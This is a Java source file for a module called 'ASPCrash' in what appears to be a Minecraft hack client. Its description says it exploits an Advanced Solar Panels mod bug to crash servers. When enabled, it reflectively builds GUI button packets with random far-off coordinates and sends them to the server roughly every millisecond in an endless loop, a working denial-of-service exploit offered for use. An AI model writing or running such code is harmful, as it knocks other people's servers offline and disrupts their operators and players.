package cn.snowflake.rose.mod.mods.FORGE.advancedsolarpanel;

import cn.snowflake.rose.Client;
import cn.snowflake.rose.mod.Category;
import cn.snowflake.rose.mod.Module;
import cn.snowflake.rose.notification.Notification;

import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class ASPCrash extends Module {

    private static ExecutorService SERVICE;
    Class<?> clazz;
    Class<?> clazz1;
    Class<?> clazz2;
    private static Random random;
    private static volatile boolean shouldStop;

    public ASPCrash() {
        super("ASPCrash","ASP Crash",Category.FORGE);

        try {
            this.clazz = Class.forName("advsolar.network.PacketGUIPressButton");
            this.clazz1 = Class.forName("advsolar.network.ASPPacketHandler");
            this.clazz2 = Class.forName("advsolar.network.IPacket");
        } catch (Throwable ex) {
          this.setWorking(false);
        }

        SERVICE = Executors.newSingleThreadExecutor();
        random = new Random();
        ASPCrash.shouldStop = false;

    }

    @Override
    public String getDescription() {
        return "高级太阳能模组BUG(让服务器崩溃)!";
    }

    @Override
    public void onEnable() {
        shouldStop = false;
        SERVICE.execute(() -> {
            while (true) {
                this.sendPacket(mc.theWorld.provider.dimensionId);
                if (shouldStop) break;
                try {
                    Thread.sleep(1L);
                }
                catch (InterruptedException interruptedException) {

                }
            }
        });
    }

    @Override
    public void onDisable() {
        ASPCrash.shouldStop = true;
    }

    private void sendPacket(int dim) {
        try {
            Object object = this.clazz.newInstance();
            int x = ASPCrash.random.nextInt(50000);
            int z = ASPCrash.random.nextInt(50000);
            this.clazz.getDeclaredField("x").set(object, x);
            this.clazz.getDeclaredField("y").set(object, 100);
            this.clazz.getDeclaredField("z").set(object, z);
            this.clazz.getDeclaredField("dimID").set(object, dim);
            this.clazz1.getMethod("sendToServer", this.clazz2).invoke(null, object);
            Client.instance.getNotificationManager().addNotification(this, (String) object, Notification.Type.WARNING);
        } catch (Throwable e) {
            e.printStackTrace();
        }

    }

}
